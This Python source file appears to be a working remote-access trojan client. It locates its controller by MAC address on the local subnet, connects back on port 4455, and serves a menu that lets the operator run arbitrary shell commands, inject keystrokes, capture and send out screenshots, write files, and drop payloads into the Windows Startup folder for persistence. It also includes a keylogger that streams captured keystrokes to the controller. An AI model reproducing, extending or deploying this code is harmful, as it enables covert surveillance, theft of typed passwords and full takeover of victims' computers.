import socket
import subprocess
import time
import tkinter as tk
import random
import webbrowser
import pyautogui
import os
import tempfile
import base64
import threading
from pynput import keyboard
from io import BytesIO
import platform



def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # doesn't actually send data
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return None

def get_subnet():
    ip = get_local_ip()
    if not ip:
        return None

    subnet = ".".join(ip.split(".")[:3])
    print(f"[+] Detected local IP: {ip}")
    print(f"[+] Using subnet: {subnet}.0/24")
    return subnet

def ping_sweep(subnet):
    print("[+] Pinging subnet to populate ARP table...")

    for i in range(1, 255):
        ip = f"{subnet}.{i}"

        if platform.system().lower() == "windows":
            subprocess.Popen(
                ["ping", "-n", "1", "-w", "100", ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        else:
            subprocess.Popen(
                ["ping", "-c", "1", "-W", "1", ip],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

def get_ip_from_mac(mac):
    mac = mac.lower().replace(":", "-")
    print(f"[+] Searching ARP table for MAC: {mac}...")

    output = subprocess.check_output("arp -a", shell=True).decode().lower()

    for line in output.splitlines():
        if mac in line:
            parts = line.split()
            for part in parts:
                if "." in part:
                    return part

    return None

target_mac = "d0:39:fa:8d:da:d0"

subnet = get_subnet()

if subnet:
    ping_sweep(subnet)
    time.sleep(2)

    ip = get_ip_from_mac(target_mac)

    if ip:
        print(f"[✓] Found IP: {ip}")
    else:
        print("[-] MAC not found, defaulting to localhost")
        ip="None"
else:
    print("[-] Could not detect subnet")

if ip == "None":
    SERVER="localhost"
else:
    SERVER=ip

PORT = 4455

def connect_to_server():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER, PORT))
            print("[*] Connected to server")
            msg = s.recv(1024).decode()
            print("[*] Server:", msg)
            return s
        except Exception as e:
            print(f"[*] Connection failed: {e}, retrying...")
            time.sleep(0.05)

def text_to_speech(text):
    try:
        text_escaped = text.replace('"', '`"')
        ps_command = f'Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Speak("{text_escaped}")'
        
        result = subprocess.run(
            ["powershell", "-Command", ps_command],
            capture_output=True,
            timeout=10
        )
        return True
    except:
        return False

def play_audio_file(audio_data):
    try:
        with tempfile.NamedTemporaryFile(suffix='.mp3', delete=False) as f:
            f.write(audio_data)
            temp_file = f.name
        
        if os.name == 'nt':
            os.startfile(temp_file)
        else:
            subprocess.run(['xdg-open', temp_file])
        
        time.sleep(2)
        try:
            os.unlink(temp_file)
        except:
            pass
        
        return True
    except:
        return False

def take_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        img_buffer = BytesIO()
        screenshot.save(img_buffer, format='PNG')
        img_bytes = img_buffer.getvalue()
        img_b64 = base64.b64encode(img_bytes).decode('utf-8')
        return img_b64
    except Exception as e:
        print(f"Screenshot error: {e}")
        return None

def save_file(file_data, file_path):
    try:
        directory = os.path.dirname(file_path)
        if directory and not os.path.exists(directory):
            os.makedirs(directory, exist_ok=True)
        
        with open(file_path, 'wb') as f:
            f.write(file_data)
        
        print(f"[+] File saved to: {file_path}")
        return True
    except Exception as e:
        print(f"[-] Error saving file: {e}")
        return False

def keystroke_mode(s):
    while True:
        try:
            data = s.recv(1024).decode()
            
            if data == 'EXIT_KEYSTROKE_MODE':
                s.send(b'[*] Exited keystroke mode')
                return True
                
            if data.startswith('TEXT:'):
                text = data[5:]
                pyautogui.write(text)
                s.send(b'[+] Text typed')
                
            elif data.startswith('KEYS:'):
                keys = data[5:]
                try:
                    if '+' in keys:
                        key_list = keys.split('+')
                        pyautogui.hotkey(*key_list)
                    else:
                        pyautogui.press(keys)
                    s.send(b'[+] Keys pressed')
                except:
                    s.send(b'[-] Key error')
                    
        except:
            return False

def audio_mode(s):
    while True:
        try:
            data = s.recv(1024).decode()
            
            if data == 'EXIT_AUDIO_MODE':
                s.send(b'[*] Exited audio mode')
                return True
            
            elif data.startswith('TTS:'):
                text = data[4:]
                if text_to_speech(text):
                    s.send(b'[+] TTS completed')
                else:
                    s.send(b'[-] TTS failed')
            
            elif data.startswith('AUDIO:'):
                audio_b64 = data[6:]
                try:
                    audio_data = base64.b64decode(audio_b64)
                    if play_audio_file(audio_data):
                        s.send(b'[+] Audio playing')
                    else:
                        s.send(b'[-] Audio failed')
                except:
                    s.send(b'[-] Audio decode error')
                    
        except:
            return False

def screenshot_mode(s):
    while True:
        try:
            data = s.recv(1024).decode()
            
            if data == 'EXIT_SCREENSHOT_MODE':
                s.send(b'[*] Exited screenshot mode')
                return True
            
            elif data == 'TAKE_SCREENSHOT':
                print("[+] Taking screenshot...")
                screenshot_b64 = take_screenshot()
                
                if screenshot_b64:
                    response = f"SCREENSHOT_OK:{screenshot_b64}"
                    s.send(response.encode())
                else:
                    s.send(b'SCREENSHOT_ERROR:Failed to take screenshot')
                    
        except Exception as e:
            print(f"Screenshot mode error: {e}")
            return False

def cmd_mode(s):
    while True:
        try:
            cmd = s.recv(1024).decode()
            
            if cmd.lower() in ['q', 'quit', 'exit']:
                s.send(b'[*] Exited command mode###END###')
                return True
                
            try:
                if cmd.strip().lower() == 'ls':
                    cmd = 'dir'
                
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                output = result.stdout + result.stderr
                if not output:
                    output = "[+] Command executed (no output)"
                
                s.send(output.encode() + b"###END###")
            except Exception as e:
                s.send(f"[-] Error: {e}###END###".encode())
                
        except:
            return False

def file_transfer_mode(s):
    try:
        path_data = s.recv(1024).decode()
        
        if path_data.startswith('SAVE_PATH:'):
            save_path = path_data[10:]
            print(f"[+] Received save path: {save_path}")
            
            if not save_path.strip():
                s.send(b'PATH_ERROR:No path provided')
                return True
            
            s.send(b'PATH_CONFIRMED')
            
            file_data = b""
            total_received = 0
            print("[+] Receiving file data...")
            
            while True:
                chunk = s.recv(8192)
                if not chunk:
                    break
                file_data += chunk
                total_received += len(chunk)
                
                if total_received % (1024 * 1024) == 0:
                    print(f"[+] Received {total_received / (1024 * 1024):.1f} MB", end='\r')
                
                if b"FILE_END" in file_data:
                    break
            
            print(f"\n[+] File received completely: {total_received} bytes")
            file_data = file_data.replace(b"FILE_END", b"")
            
            if save_file(file_data, save_path):
                s.send(b'FILE_SAVED:File transferred successfully')
            else:
                s.send(b'FILE_ERROR:Failed to save file')
        else:
            s.send(b'PATH_ERROR:Invalid path format')
            
        return True
    except Exception as e:
        print(f"File transfer error: {e}")
        s.send(b'TRANSFER_ERROR:File transfer failed')
        return True

def background_file_execution_mode(s):
    while True:
        try:
            data = s.recv(1024).decode()
            
            if data == 'EXIT_BACKGROUND_MODE':
                s.send(b'[*] Exited background execution mode')
                return True
            
            elif data.startswith('BG_FILE:'):
                parts = data.split(':', 3)
                if len(parts) >= 4:
                    filename = parts[1]
                    file_size = int(parts[2])
                    
                    if os.name == 'nt':
                        startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                    else:
                        startup_path = os.path.expanduser('~')
                    
                    full_path = os.path.join(startup_path, filename)
                    
                    print(f"[+] Receiving: {filename} ({file_size / (1024*1024):.2f} MB) to startup")
                    
                    s.send(b'READY')
                    
                    file_data = b""
                    received = 0
                    chunk_size = 131072
                    start_time = time.time()
                    
                    while received < file_size:
                        remaining = file_size - received
                        chunk = s.recv(min(chunk_size, remaining))
                        if not chunk:
                            break
                        file_data += chunk
                        received += len(chunk)
                        
                        if received % (5 * 1024 * 1024) == 0:
                            elapsed = time.time() - start_time
                            speed = received / (1024 * 1024) / elapsed if elapsed > 0 else 0
                            print(f"    Progress: {received / (1024*1024):.1f} MB / {file_size / (1024*1024):.1f} MB ({speed:.1f} MB/s)")
                    
                    if received == file_size:
                        if save_file(file_data, full_path):
                            elapsed = time.time() - start_time
                            speed = file_size / (1024 * 1024) / elapsed if elapsed > 0 else 0
                            s.send(f'SUCCESS:File saved to startup: {full_path} ({speed:.1f} MB/s)'.encode())
                            print(f"[✓] Transfer complete: {speed:.1f} MB/s")
                        else:
                            s.send(b'ERROR:Failed to save file')
                    else:
                        s.send(f'ERROR:File corrupted: {received}/{file_size} bytes'.encode())
                        
                else:
                    s.send(b'ERROR:Invalid header format')
                    
        except Exception as e:
            print(f"Background mode error: {e}")
            s.send(b'ERROR:Transfer failed')
            return False

def keylogger_mode(s):
    print("[*] Starting keylogger...")
    
    s.settimeout(0.1)
    try:
        while True:
            s.recv(4096)
    except:
        pass
    s.settimeout(None)
    
    log_data = []
    is_logging = True
    log_file = os.path.join(tempfile.gettempdir(), f"log_{int(time.time())}.txt")
    
    def on_press(key):
        if not is_logging:
            return False
            
        try:
            if hasattr(key, 'char') and key.char is not None:
                if key.char is not None and len(key.char) == 1 and ord(key.char) >= 32:
                    log_data.append(key.char)
            else:
                special_keys = {
                    keyboard.Key.space: ' ', keyboard.Key.enter: '\n', keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[BACKSPACE]', keyboard.Key.esc: '[ESC]',
                    keyboard.Key.shift: '[SHIFT]', keyboard.Key.ctrl_l: '[CTRL]', keyboard.Key.ctrl_r: '[CTRL]',
                    keyboard.Key.alt_l: '[ALT]', keyboard.Key.alt_r: '[ALT]', keyboard.Key.cmd: '[WIN]',
                }
                log_data.append(special_keys.get(key, f'[{key}]'))
                
            if len(log_data) >= 20:
                save_log()
                
        except Exception as e:
            print(f"Keylogger error: {e}")
    
    def save_log():
        if log_data:
            try:
                with open(log_file, 'a', encoding='utf-8') as f:
                    f.write(''.join(log_data))
                log_data.clear()
                return True
            except Exception as e:
                print(f"Save error: {e}")
        return False
    
    def send_logs():
        while is_logging:
            time.sleep(3)
            if os.path.exists(log_file) and is_logging:
                try:
                    with open(log_file, 'r', encoding='utf-8') as f:
                        content = f.read()
                    if content and is_logging:
                        s.send(f"KEYLOG:{content}".encode())
                        open(log_file, 'w').close()
                except Exception as e:
                    if is_logging:
                        print(f"Send error: {e}")
    
    try:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        
        sender_thread = threading.Thread(target=send_logs, daemon=True)
        sender_thread.start()
        
        s.send(b'KEYLOGGER_READY')
        print("[+] Keylogger ready - capturing keystrokes...")
        
        while is_logging:
            try:
                s.settimeout(1.0)
                data = s.recv(1024).decode()
                
                if data == 'STOP_KEYLOGGER':
                    print("[+] Stopping keylogger...")
                    is_logging = False
                    listener.stop()
                    save_log()
                    
                    if os.path.exists(log_file):
                        with open(log_file, 'r', encoding='utf-8') as f:
                            final_content = f.read()
                        if final_content:
                            s.send(f"FINAL_LOG:{final_content}".encode())
                    
                    try:
                        if os.path.exists(log_file):
                            os.remove(log_file)
                    except:
                        pass
                    
                    s.send(b'KEYLOGGER_STOPPED')
                    print("[+] Keylogger stopped successfully")
                    return True
                    
                elif data == 'GET_STATUS':
                    log_size = len(log_data)
                    file_exists = os.path.exists(log_file)
                    file_size = os.path.getsize(log_file) if file_exists else 0
                    status = f"STATUS:Buffer:{log_size} chars, File:{file_size} bytes, Active:{is_logging}"
                    s.send(status.encode())
                    
                elif data == 'SAVE_NOW':
                    if save_log():
                        s.send(b'SAVE_COMPLETE:Logs saved')
                    else:
                        s.send(b'SAVE_ERROR:No data to save')
                    
            except socket.timeout:
                continue
            except Exception as e:
                if is_logging:
                    print(f"Keylogger comm error: {e}")
                    break
                
    except Exception as e:
        print(f"Keylogger mode error: {e}")
        is_logging = False
        try:
            s.send(b'KEYLOGGER_ERROR')
        except:
            pass
        return False

def prank_mode(s):

    def run_cmd(cmd):
        try:
            if cmd.strip().lower() == 'ls':
                cmd = 'dir'

            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )

            output = result.stdout + result.stderr
            if not output:
                output = "[+] Executed (no output)"

            return output

        except Exception as e:
            return f"[-] Error: {e}"

    # ===== MAIN LOOP =====
    while True:
        try:
            data = s.recv(1024).decode().strip()
            print(f"[*] Received prank command: {data}")

            if data == "EXIT_PRANK_MODE":
                s.send(b"[+] Exited simulation mode")
                return True

            if not data.startswith("PRANK:"):
                continue

            parts = data.split(":")
            prank = parts[1]

            # ===== COMMAND MAPPING =====
            if prank == "FAKE_UPDATE":
                print("[*] Simulating fake update prank...")
                cmd = 'echo Installing Updates... && timeout /t 5'

            elif prank == "KEY_ECHO":  
                print("[*] Simulating key echo prank...")
                cmd = 'for /L %i in (1,1,10) do echo echo echo'

            elif prank == "FLASH":
                print("[*] Simulating flash prank...")
                cmd = 'powershell -NoProfile -Command "for ($i=0; $i -lt 5; $i++) {cls; Start-Sleep -Milliseconds 200}"'

            elif prank == "FAKE_ALERT":
                print("[*] Simulating fake alert prank...")
                sub = parts[2] 
                cmd = f'powershell -NoProfile -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show(\'{sub}\', \'Alert\')"'

            elif prank == "WINDOW_SPAM":
                print("[*] Simulating window spam prank...")
                sub = parts[2] if len(parts) > 2 else "3"
                cmd = f'for /L %i in (1,1,{sub}) do start "" cmd /c echo Hello'

            elif prank == "FUN_MEDIA":
                print("[*] Simulating fun media prank...")
                cmd = 'start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ'

            else:
                s.send(b"[-] Unknown prank type")
                continue

            # ===== EXECUTE =====
            output = run_cmd(cmd)

            # send back result
            s.send((output + "###END###").encode())

        except Exception as e:
            s.send(f"[-] Error: {e}###END###".encode())
            return False
                 
def main():
    while True:
        try:
            s = connect_to_server()
            
            while True:
                menu = """
[0] Command Mode
[1] Keystroke Mode  
[2] Audio Mode
[3] Screenshot Mode
[4] File Transfer Mode
[5] Background File Execution Mode
[6] Keylogger Mode
[7] User Environment Simulation
[q] Quit
Select: """
                s.send(menu.encode())
                
                choice = s.recv(1024).decode().strip()
                
                s.settimeout(0.1)
                try:
                    while True:
                        s.recv(4096)
                except:
                    pass
                s.settimeout(None)
                
                if choice == '0':
                    if not cmd_mode(s):
                        break
                elif choice == '1':
                    if not keystroke_mode(s):
                        break
                elif choice == '2':
                    if not audio_mode(s):
                        break
                elif choice == '3':
                    if not screenshot_mode(s):
                        break
                elif choice == '4':
                    if not file_transfer_mode(s):
                        break
                elif choice == '5':
                    if not background_file_execution_mode(s):
                        break
                elif choice == '6':
                    if not keylogger_mode(s):
                        break
                elif choice == '7':
                    if not prank_mode(s):
                        break
                elif choice.lower() in ['q', 'quit']:
                    s.close()
                    return
                else:
                    s.send(b'[-] Invalid choice')
                    
        except Exception as e:
            print(f"Connection error: {e}")
            time.sleep(2)
            continue

if __name__ == "__main__":
    print("[*] Client started - Press Ctrl+C to stop")
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Client stopped")